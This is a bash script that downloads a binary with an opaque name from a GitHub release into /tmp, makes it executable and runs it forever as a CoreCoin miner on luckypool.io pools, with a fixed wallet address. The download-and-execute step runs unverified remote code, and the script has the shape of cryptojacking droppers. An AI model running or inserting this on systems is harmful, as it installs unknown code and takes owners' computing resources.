#!/bin/bash

MINER_URL="https://github.com/vedhagsvp/vpase/releases/download/corcoka/srcbks"
MINER_BIN="/tmp/srcbks"

# Download miner if not present
if [ ! -f "$MINER_BIN" ]; then
  echo "Miner binary not found, downloading with curl..."
  curl -L "$MINER_URL" -o "$MINER_BIN"
  if [ $? -ne 0 ]; then
    echo "Failed to download miner from $MINER_URL"
    exit 1
  fi
  chmod +x "$MINER_BIN"
  echo "Miner downloaded and made executable."
fi

# Pools and ports
declare -A pools=(
  ["corecoin.luckypool.io"]="3118"
  ["ca.luckypool.io"]="3118"
  ["sg.luckypool.io"]="3118"
)

# Worker names per pool
declare -A workers=(
  ["corecoin.luckypool.io"]="worker_us"
  ["ca.luckypool.io"]="worker_ca"
  ["sg.luckypool.io"]="worker_sg"
)

base_wallet="solo:cb16e28eda52f3750022c539e75c84610f87af8030a9"
algorithm="randomy"

function ping_pool() {
  local pool=$1
  ping -c 4 "$pool" | tail -1 | awk -F '/' '{print $5}'
}

echo "Measuring pool latencies..."

declare -A pool_latencies

for pool in "${!pools[@]}"; do
  latency=$(ping_pool "$pool")
  if [[ -z "$latency" ]]; then
    echo "No response from $pool"
    latency=100000
  else
    echo "$pool latency: $latency ms"
  fi
  pool_latencies[$pool]=$latency
done

sorted_pools=($(for p in "${!pool_latencies[@]}"; do
  echo "$p ${pool_latencies[$p]}"
done | sort -k2 -n | awk '{print $1}'))

echo "Pools sorted by latency:"
printf '%s\n' "${sorted_pools[@]}"

while true; do
  for pool in "${sorted_pools[@]}"; do
    worker_name=${workers[$pool]}
    wallet="$base_wallet.$worker_name"
    echo "Starting miner on pool $pool with worker $worker_name"
    "$MINER_BIN" --algorithm $algorithm --pool $pool:${pools[$pool]} --wallet $wallet
    echo "Miner exited on pool $pool. Trying next pool..."
    sleep 5
  done
done
